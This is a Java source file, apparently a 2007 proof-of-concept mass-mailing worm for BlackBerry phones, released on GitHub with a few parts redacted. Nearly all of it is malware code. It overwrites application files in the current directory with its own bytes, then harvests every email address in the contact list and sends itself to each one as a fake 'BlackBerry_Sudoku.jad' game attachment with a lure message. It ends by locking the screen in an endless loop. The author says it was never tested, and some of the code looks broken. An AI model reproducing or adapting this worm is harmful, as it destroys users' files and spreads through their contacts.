/*
 * trilby.java - "I-Worm/BlackBerry.Trilby"
 * by Dorian Warboys / Red Skål
 * https://github.com/redskal/
 *
 * Coded in 2007
 *
 * This was written as a PoC back when Blackberry phones
 * were the flavour of the month (see what I did there!?)
 *
 * This code was never tested because RIM required developers
 * to buy signing cert's to publish code, their JDE was
 * absolute trash, and I could never get the simulator they
 * shipped to work. This was also my first and last experience
 * with Java; yes, I hated it that much!
 *
 * Some of the code has been redacted so I can maintain some
 * OpSec.
 */

package trilby;

import net.rim.device.api.io.*;
import net.rim.device.api.ui.*;
import net.rim.device.api.ui.component.*;
import net.rim.device.api.ui.container.*;
import net.rim.device.api.i18n.*;
import net.rim.device.api.system.*;
import net.rim.blackberry.api.mail.*;
import net.rim.blackberry.api.mail.event.*;
import java.io.*;
import java.util.*;
import java.lang.*;
import javax.microedition.io.*;
import javax.microedition.pim.*;
import trilby.fux0r.*;


/*
 * 
 */
public class trilby extends fux0r {
    
    public static String NAME = "I-Worm/BlackBerry.trilby";
    public static String AUTH = "REDACTED";
    public static String _trilby; // used for filename.
    
    // main()
    public static void main(String[] args) {
        _trilby = args[0];  // _trilby should contain our name.
        trilby app = new trilby();
        app.enterEventDispatcher();
    }
    
    public trilby() {
        // infect .cod & .jad files. (overwrite because the files will probably be signed so it may inhibit parasitic infection)
        // get cwd
        String cwd = System.getProperty("user.dir");
        java.io.File dir = new java.io.File(cwd);
        // list files & dirs
        java.io.File files[] = dir.listFiles();
        java.io.File worm = new java.io.File(_trilby);
        boolean isDir;
        for (int i=0; i < files.length; i++) {
            // is files[n] a directory?
            if ( (isDir = files[i].isDirectory()) == false) {
                // no. check the extension.
                String check = (String)files[i].getName();
                String ext = (check.lastIndexOf(".")==-1)?"":check.substring(check.lastIndexOf(".")+1,check.length());
                // is it a target?
                if (ext == "cod" || ext == "jad") {
                    copyfile(worm,files[i]);   // yes! we infect.
                }
            }
        }
        
        // open the contact list
        PIM pim = PIM.getInstance();
        ContactList clst;
        try {
            clst = (ContactList)pim.openPIMList(PIM.CONTACT_LIST, PIM.READ_WRITE);
        } catch(Exception e) {
            //do nothing
        }
        // extract the email addresses
        int i, emailCnt, attr;
        Contact c;
        String email;
        byte[] worm2 = getbytesfromfile(worm);
        Enumeration enm = clst.items();
        while ( (c = (Contact) enm.nextElement()) != null ) {
            emailCnt = c.countValues(Contact.EMAIL);
            for (i=0; i<emailCnt; i++) {
                if ( c.getAttributes(Contact.EMAIL, i) != 0 ) {
                    email = c.getString(Contact.EMAIL, i);
                    // process email addr.
                    emailer em = new emailer(email,worm2);
                    em.start();
                } // if
            } // for
        } // while
        
        // show our i'face
        MainScreen screen = new MainScreen();
        screen.setTitle(new LabelField(NAME+" by "+AUTH, LabelField.USE_ALL_WIDTH));
        LabelField bbb = new LabelField(NAME+" by "+AUTH+"\r\n\r\nI'm scrumping for Blackberry's :P", LabelField.FIELD_HCENTER | LabelField.NON_FOCUSABLE | LabelField.OPAQUE);
        screen.add(bbb);
        pushModalScreen(screen);
        boolean loop = true;
        while (loop) {
            // never leave
        }
        popScreen(screen); // (just to be clean)
    } // trilby
    
    // copy: src -> dst
    public void copyfile(java.io.File src, java.io.File dst) throws IOException {
        InputStream in = new java.io.FileInputStream(src);
        OutputStream out = new java.io.FileOutputStream(dst);
        // this method of infection may invoke errors.  I don't know Java well enough
        // to say wheather this overwrite technique will leave corrupted data at the
        // end of our file if the target is larger than our worm.
        byte[] buff = new byte[1024];
        int len;
        while ((len = in.read(buff)) > 0) {
            out.write(buff, 0, len);
        }
        in.close();
        out.close();
    }
    
    // read file to byte array
    public byte[] getbytesfromfile(java.io.File file) {
        InputStream is = new java.io.FileInputStream(file);
        
        // size of file
        long len = file.length();
        
        if (len > Integer.MAX_VALUE) {
            // file is too big
            System.err.println("w0rm.err: it's too big for the hole - try easing it in like a gentlemen?");
            System.exit(0);
        }
        
        byte[] buf = new byte[(int)len];
        
        int offset = 0;
        int numRead = 0;
        while (offset < buf.length && (numRead=is.read(buf, offset, buf.length-offset)) >= 0) {
            offset += numRead;
        }
        
        // all our bytes read?
        if (offset < buf.length) {
            throw new IOException("w0rm.err: "+file.getName()+" fux0r3d?");
        }
        
        // close the file
        is.close();
        return buf;
    }
    
    // emailer thread
    private class emailer extends Thread {
        String email;
        byte[] trilby;
        public emailer(String email, byte[] trilby) {
            this.email = email;
            this.trilby = trilby;
        }
        
        public void run() {
            /*
            Store store = Session.getDefaultInstance().getStore();
            Folder[] folders = store.list(Folder.SENT);
            Folder sent = folders[0];
            Messgae msg = new Message(sent);
            Address toList[] = new Address[1];
            try {
                toList[0] = new Address(email, email);
            } catch(AddressException e) {
                // do nothing
            }
            try {
                msg.addRecipients(Message.RecipientType.TO, toList);
            } catch(MessagingException e) {
                // do nothing
            }
            msg.setSubject("I found this Sudoku game for BlackBerry's");
            try {
                msg.setContent("Just a quick email to show you this BlackBerry Sudoku game.  See if you can solve it on Hard mode!");
            } catch(MessagingException e) {
                // do nothing
            }
            try {
                Transport.send(msg);
            } catch(MessagingException e) {
                // do nothing
            }
            */
            // ^^^ That was my original code, modified from BlackBerry examples.
            // Unfortunately I had trouble implementing attachments so managed to
            // find this code stashed away on the BlackBerry Developer Lab. . .
            // create multipart
            Multipart mp = new Multipart();
            
            // data for the message
            String msgdta = "Just a quick email to show you this BlackBerry Sudoku game.  See if you can solve it on Hard mode!";
            
            // create the file
            String fuck_you = trilby.toString();
            SupportedAttachmentPart sap = new SupportedAttachmentPart(mp,"application/octet-stream","BlackBerry_Sudoku.jad",fuck_you);
            
            // set up the message content
            TextBodyPart tbp = new TextBodyPart(mp,msgdta);
            
            //add the file to the multipart
            mp.addBodyPart(tbp);
            mp.addBodyPart(sap);
            
            //create a message in the sent items folder
            Folder folders[] = Session.getDefaultInstance().getStore().list(Folder.SENT);
            
            Message msg = new Message(folders[0]);
            
            //add recipients to the message and send
            try {
                Address toAdd = new Address(email,"USER_77489756");
                Address toAdds[] = new Address[1];
                toAdds[0] = toAdd;
                msg.addRecipients(Message.RecipientType.TO,toAdds);
                msg.setContent(mp);

                Transport.send(msg);
            } catch (Exception e) {
                // do nothing
            }
        }
    }
} 
